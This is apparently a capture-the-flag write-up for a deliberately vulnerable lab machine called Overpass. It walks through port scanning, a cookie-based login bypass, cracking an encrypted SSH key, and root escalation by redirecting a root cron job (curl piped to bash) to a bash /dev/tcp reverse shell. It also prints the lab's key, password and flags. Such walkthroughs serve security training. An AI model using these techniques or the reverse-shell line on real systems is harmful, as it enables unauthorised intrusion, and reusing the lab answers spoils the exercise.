
#security #owasp_top_10 #easy #cron

---

> Do an nmap scan to see the open ports with their services.

```
nmap -sC -sV 10.10.144.126
```

```
Starting Nmap 7.94 ( https://nmap.org ) at 2023-08-01 16:19 EDT
Nmap scan report for 10.10.144.126
Host is up (0.075s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 37:96:85:98:d1:00:9c:14:63:d9:b0:34:75:b1:f9:57 (RSA)
|   256 53:75:fa:c0:65:da:dd:b1:e8:dd:40:b8:f6:82:39:24 (ECDSA)
|_  256 1c:4a:da:1f:36:54:6d:a6:c6:17:00:27:2e:67:75:9c (ED25519)
80/tcp open  http    Golang net/http server (Go-IPFS json-rpc or InfluxDB API)
|_http-title: Overpass
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 16.31 seconds
```

> Port 80 is open, so writing the IP address in the browser.
> Going through the web application i see nothing special, so i decided to run a directory enumeration attack to see if there are any hidden directories.
```
gobuster dir -u http://10.10.144.126 -w /usr/share/wordlists/dirb/common.txt
```

```
===============================================================
Gobuster v3.5
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.144.126
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.5
[+] Timeout:                 10s
===============================================================
2023/08/01 16:26:10 Starting gobuster in directory enumeration mode
===============================================================
/aboutus              (Status: 301) [Size: 0] [--> aboutus/]
/admin                (Status: 301) [Size: 42] [--> /admin/]
/css                  (Status: 301) [Size: 0] [--> css/]
/downloads            (Status: 301) [Size: 0] [--> downloads/]
/img                  (Status: 301) [Size: 0] [--> img/]
/index.html           (Status: 301) [Size: 0] [--> ./]
Progress: 4572 / 4615 (99.07%)
===============================================================
2023/08/01 16:26:46 Finished
===============================================================

```

> There is the `/admin` page.
> Visiting it we see that we need to enter a username and password.
> Inspecting this page's source code, we see there is a script called `login.js`.

![](./screenshots/js.png)

> In the `login()` function at the bottom, we see the else statement.
> It logs us in if the `statusOrCookie` doesn't have the value `incorrect credentials`.
> Moreover, inside, we see that it sets the `SessionToken` cookie to the value inside the `statusOrCookie` cookie.
> Trying to set the value of the `SessionToken` cookie ourselves through the console.

```
Cookies.set("SessionToken", '')
```
> Refreshing the page, we see we pass the login page, and it contains a private SSH key that is encrypted.
> What happens is that if we enter the correct creds, this cookie is set and we go to the admin page.
> Maybe there is some invalid logic, and once we set the cookie, the website thinks we already entered the correct creds, so we are taken to the `/admin` page.

![](./screenshots/14.png)

```
-----BEGIN RSA PRIVATE KEY-----
Proc-Type: 4,ENCRYPTED
DEK-Info: AES-128-CBC,9F85D92F34F42626F13A7493AB48F337

LNu5wQBBz7pKZ3cc4TWlxIUuD/opJi1DVpPa06pwiHHhe8Zjw3/v+xnmtS3O+qiN
JHnLS8oUVR6Smosw4pqLGcP3AwKvrzDWtw2ycO7mNdNszwLp3uto7ENdTIbzvJal
73/eUN9kYF0ua9rZC6mwoI2iG6sdlNL4ZqsYY7rrvDxeCZJkgzQGzkB9wKgw1ljT
WDyy8qncljugOIf8QrHoo30Gv+dAMfipTSR43FGBZ/Hha4jDykUXP0PvuFyTbVdv
BMXmr3xuKkB6I6k/jLjqWcLrhPWS0qRJ718G/u8cqYX3oJmM0Oo3jgoXYXxewGSZ
AL5bLQFhZJNGoZ+N5nHOll1OBl1tmsUIRwYK7wT/9kvUiL3rhkBURhVIbj2qiHxR
3KwmS4Dm4AOtoPTIAmVyaKmCWopf6le1+wzZ/UprNCAgeGTlZKX/joruW7ZJuAUf
ABbRLLwFVPMgahrBp6vRfNECSxztbFmXPoVwvWRQ98Z+p8MiOoReb7Jfusy6GvZk
VfW2gpmkAr8yDQynUukoWexPeDHWiSlg1kRJKrQP7GCupvW/r/Yc1RmNTfzT5eeR
OkUOTMqmd3Lj07yELyavlBHrz5FJvzPM3rimRwEsl8GH111D4L5rAKVcusdFcg8P
9BQukWbzVZHbaQtAGVGy0FKJv1WhA+pjTLqwU+c15WF7ENb3Dm5qdUoSSlPzRjze
eaPG5O4U9Fq0ZaYPkMlyJCzRVp43De4KKkyO5FQ+xSxce3FW0b63+8REgYirOGcZ
4TBApY+uz34JXe8jElhrKV9xw/7zG2LokKMnljG2YFIApr99nZFVZs1XOFCCkcM8
GFheoT4yFwrXhU1fjQjW/cR0kbhOv7RfV5x7L36x3ZuCfBdlWkt/h2M5nowjcbYn
exxOuOdqdazTjrXOyRNyOtYF9WPLhLRHapBAkXzvNSOERB3TJca8ydbKsyasdCGy
AIPX52bioBlDhg8DmPApR1C1zRYwT1LEFKt7KKAaogbw3G5raSzB54MQpX6WL+wk
6p7/wOX6WMo1MlkF95M3C7dxPFEspLHfpBxf2qys9MqBsd0rLkXoYR6gpbGbAW58
dPm51MekHD+WeP8oTYGI4PVCS/WF+U90Gty0UmgyI9qfxMVIu1BcmJhzh8gdtT0i
n0Lz5pKY+rLxdUaAA9KVwFsdiXnXjHEE1UwnDqqrvgBuvX6Nux+hfgXi9Bsy68qT
8HiUKTEsukcv/IYHK1s+Uw/H5AWtJsFmWQs3bw+Y4iw+YLZomXA4E7yxPXyfWm4K
4FMg3ng0e4/7HRYJSaXLQOKeNwcf/LW5dipO7DmBjVLsC8eyJ8ujeutP/GcA5l6z
ylqilOgj4+yiS813kNTjCJOwKRsXg2jKbnRa8b7dSRz7aDZVLpJnEy9bhn6a7WtS
49TxToi53ZB14+ougkL4svJyYYIRuQjrUmierXAdmbYF9wimhmLfelrMcofOHRW2
+hL1kHlTtJZU8Zj2Y2Y3hd6yRNJcIgCDrmLbn9C5M0d7g0h2BlFaJIZOYDS6J6Yk
2cWk/Mln7+OhAApAvDBKVM7/LGR9/sVPceEos6HTfBXbmsiV+eoFzUtujtymv8U7
-----END RSA PRIVATE KEY-----
```

> To break this encryption we use ssh2john.
> We first save this private key in a file, call it `id_rsa`.

```
ssh2john id_rsa > id_rsa.txt
```

> Now we can run john on this `id_rsa.txt` to get the password.

```
john --wordlist=/usr/share/wordlists/rockyou.txt id_rsa.txt  
```

```
Using default input encoding: UTF-8
Loaded 1 password hash (SSH, SSH private key [RSA/DSA/EC/OPENSSH 32/64])
Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 0 for all loaded hashes
Cost 2 (iteration count) is 1 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
james13          (id_rsa)     
1g 0:00:00:00 DONE (2023-08-01 16:55) 50.00g/s 668800p/s 668800c/s 668800C/s pink25..honolulu
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
```

> We see the password is `james13`.
> From the website, we see the username `James` alot. So using that username, the password we cracked, and the private ssh key, we can login via ssh to the machine.

> First, we need to change permissions for the `id_rsa` for it work.

```shell
chmod 600 id_rsa
```

> Then we can connect.

```
ssh -i id_rsa James@10.10.144.126
```

> Doesn't work.
> Trying the username without the capital letter and passowrd `james13`.

```
ssh -i id_rsa james@10.10.144.126
```

> It works, and we are now logged in as james into the machine.

![](./screenshots/ssh.png)

> We see the first flag.
###### Hack the machine and get the flag in user.txt : `thm{65c1aaf000506e56996822c6281e6bf7}`

> The next step is to try and become root user.
> Need to find a way to escalate privileges.
> In the `todo.txt` it said something about an automated script, so lets check out `/etc/crontab`.

```
# /etc/crontab: system-wide crontab
# Unlike any other crontab you don't have to run the `crontab'
# command to install the new version when you edit this file
# and files in /etc/cron.d. These files also have username fields,
# that none of the other crontabs do.

SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# m h dom mon dow user  command
17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
# Update builds from latest code
* * * * * root curl overpass.thm/downloads/src/buildscript.sh | bash

```

> We see in the last line, that every minute, this script called `buildscript` is run with root privileges.
> It gets that script by accessing the machines domain, and then going to the folder `/downloads/src` and then gets the script `buildscript.sh`.
> If we can modify the way the name `overpass.thm` resolves by changing the IP address it resolves to our machine's IP address, we can then create the directory `/downloads/src` and create our own script `buildscript.sh` that will run with root privileges.

> To do that, we need to access the `/etc/hosts` file and be able to modify it.
```
nano /etc/hosts
```
> Works, meaning we have write access.

![](./screenshots/nano.png)

> We need to change the IP address that `overpass.thm` resolves to, and make it our own IP address.
> To get our machine's IP address, we do `ifconfig`.

![](./screenshots/ifconfig.png)

> Therefore, our IP address is `10.18.5.150`.
> Changing the `/etc/hosts` file.

![](./screenshots/nano-1.png)

> Next, we need to create the path `/downloads/src` in our machine.

```
mkdir -p downloads/src
```

> Whats remaining is to create the `buildscript.sh` file.
> This file is going to contain a reverse shell script so that we get access to the target machine as root. This is the case since the cronjob is run as root.

> Inside `/downloads/src`, create a file called `buildscript.sh`.
```
nano buildscript.sh
```

> And inside it paste this code for the reverse shell.

```
#!/bin/bash
bash -i >& /dev/tcp/10.18.5.150/4444 0>&1
```
> Where the IP is the IP of our attacking machine, and 4444 is an open port.
> Make this shell executable.

```
chmod +x buildscript.sh
```

> Now, we need to start a server, such that the domain `overpass.thm` that now resolves to our IP address is available to be reached.
> However, we need to be located in the directory right before `downloads/src`. This is because the cronjob goes into `/downloads/src/buildscript.sh`.

```shell
python3 -m http.server 80 
```

> At the same time, we open another tab, and create a listener that will listen for the reverse shell connection.
> Do that via netcat, with the same port as the one inside the `buildscript.sh`.

```
nc -nlvp 4444
```

> After a minute, we see on the server a `GET` request fetching the script.

![](./screenshots/shell.png)

> And on the listener, we see a connection.

``` shell
└─$ nc -nlvp 4444 
listening on [any] 4444 ...
connect to [10.18.5.150] from (UNKNOWN) [10.10.144.211] 33248
bash: cannot set terminal process group (1409): Inappropriate ioctl for device
bash: no job control in this shell
root@overpass-prod:~# ls
ls
buildStatus
builds
go
root.txt
src
root@overpass-prod:~# cat root.txt
cat root.txt
thm{7f336f8c359dbac18d54fdd64ea753bb}
root@overpass-prod:~# 

```

> We are inside as the root user, and we see the flag.

###### Escalate your privileges and get the flag in root.txt : `thm{7f336f8c359dbac18d54fdd64ea753bb}`

---

#### Note

> To escalate priviliges, i found the cronjob by luck.
> The correct technique would have been to run an automated tool such as linpeas.

> To do that, download the linpeas.sh script on the attacking machine and start a python server.

``` shell
python3 -m http.server 80
```

> Then on the target machine, use `wget` to download it.

``` shell
wget http://<my-machine-ip>:80/linpeas.sh
```

> Once it downloads, set it to be executable.

``` shell
chmod +x linpeas.sh
```

> Finally, run it and complete the task.

``` shell
./linpeas.sh
```

---
